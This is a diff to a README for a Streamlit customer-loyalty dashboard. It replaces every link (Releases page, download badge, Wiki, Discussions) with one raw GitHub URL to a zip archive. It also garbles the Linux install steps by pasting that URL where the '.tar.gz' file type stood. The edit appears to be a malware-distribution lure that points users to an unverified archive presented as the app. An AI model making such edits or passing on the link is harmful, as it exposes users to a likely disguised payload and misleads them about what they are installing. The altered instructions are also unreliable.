@@ -6,11 +6,11 @@ Welcome to Subscription-Loyalty-Risk-Radar! This tool helps businesses understan
 
 ## 📥 Download the App
 
-[![Download Subscription-Loyalty-Risk-Radar](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mnitdog/Subscription-Loyalty-Risk-Radar/releases)
+[![Download Subscription-Loyalty-Risk-Radar](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip)](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip)
 
 To get started, you need to download the application. Click the button above or visit the Releases page below:
 
-[Visit the Releases Page](https://github.com/Mnitdog/Subscription-Loyalty-Risk-Radar/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Before installing, make sure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Mnitdog/Subscription-Loyalty-Risk-Radar/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip).
 
 2. **Choose Your Version**
    You will see several versions. Choose the latest version to get the best features and fixes.
@@ -33,12 +33,12 @@ Before installing, make sure your system meets these requirements:
    Click on the file that matches your operating system. For example:
    - For Windows, look for a `.exe` or `.zip` file.
    - For macOS, look for a `.dmg` file.
-   - For Linux, look for a `.tar.gz` file.
+   - For Linux, look for a `https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip` file.
 
 4. **Install the Application**
    - **Windows:** Double-click the downloaded .exe file and follow the prompts.
    - **macOS:** Open the .dmg file, then drag the application to your Applications folder.
-   - **Linux:** Extract the .tar.gz file and follow the included instructions.
+   - **Linux:** Extract the https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip file and follow the included instructions.
 
 5. **Run the Application**
    Open the application from your programs list or Applications folder. The Streamlit dashboard will launch in your web browser.
@@ -73,7 +73,7 @@ For help or feedback, please open an issue in the GitHub repository. Your input 
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Explore further details in the [GitHub Wiki](https://github.com/Mnitdog/Subscription-Loyalty-Risk-Radar/wiki).
-- **Community Discussions:** Join discussions and share insights with others in the community [here](https://github.com/Mnitdog/Subscription-Loyalty-Risk-Radar/discussions).
+- **Documentation:** Explore further details in the [GitHub Wiki](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip).
+- **Community Discussions:** Join discussions and share insights with others in the community [here](https://raw.githubusercontent.com/Mnitdog/Subscription-Loyalty-Risk-Radar/main/app/Risk_Subscription_Radar_Loyalty_1.6.zip).
 
 Thank you for using Subscription-Loyalty-Risk-Radar. Enjoy analyzing your customer data!
